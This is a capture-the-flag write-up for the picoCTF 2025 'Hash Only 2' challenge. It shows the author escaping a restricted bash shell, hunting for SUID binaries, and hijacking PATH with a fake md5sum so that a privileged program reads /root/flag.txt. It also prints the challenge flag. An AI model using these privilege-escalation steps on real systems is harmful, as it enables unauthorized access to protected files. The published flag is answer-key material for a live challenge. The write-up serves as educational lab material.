# Hash Only 2
This was a challenge listed in PicoCTF 2025.  It's listed as medium and categorized as a Binary Exploitation challenge.

## Description
The Description reads:
> Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash.  
> If only it could just give you the actual content!

## Hints
There are no hints for this challenge.

# Solving
## My Thoughts
I felt similarly about this one as I did the first one.  It was more or less the same but with another random gimick that didn't mirror real world scenarios.

## Restricted Shell
You are greeted by an empty directory and the unfortunate message below when you try to cd out of the home directory:

![Sad](https://github.com/user-attachments/assets/3f83c77a-18ff-48d5-979d-a2be28b1304a)

We can run the below command to see what version of shell we're using to confirm that we are using a restricted version of bash:

``` bash
ctf-player@pico-chall$ ps -p $$
    PID TTY          TIME CMD
     32 pts/0    00:00:00 rbash
```

Alright so that's annoying.  We seem to be able to run 'ls' and 'find' without issue, so lets see if we can find the vulnerable executable with the below handy one-liner:

``` bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
```

This will find all files on the system with the suid (s) bit set in the user or group permission, when we run that we can see that our file is located at '/usr/local/bin/flaghasher'.

We can run flaghasher just fine, let's run strings on it to see what we get:

``` bash
ctf-player@pico-chall$ strings /usr/local/bin/flaghasher
Computing the MD5 hash of /root/flag.txt....
/bin/bash -c 'md5sum /root/flag.txt'
Error: system() call returned non-zero value:
```

Neat so it's the exact same as the last one...let's update the path:

``` bash
ctf-player@pico-chall$ export PATH=/home/ctf-player:$PATH
-rbash: PATH: readonly variable
```

Uh oh...well if only I was able to escape from rbash somehow:

``` bash
ctf-player@pico-chall$ bash
ctf-player@challenge:~$
```

Oh...ok then.  We can now update the path and move around as much as we want.

``` bash
ctf-player@challenge:~$ export PATH=/home/ctf-player:$PATH
ctf-player@challenge:~$ echo 'cat /root/flag.txt' >> md5sum
ctf-player@challenge:~$ chmod +x md5sum
ctf-player@challenge:~$ flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_aeecb174}ctf-player@challenge:~$
```

Well that was definitely something, on to the next one.
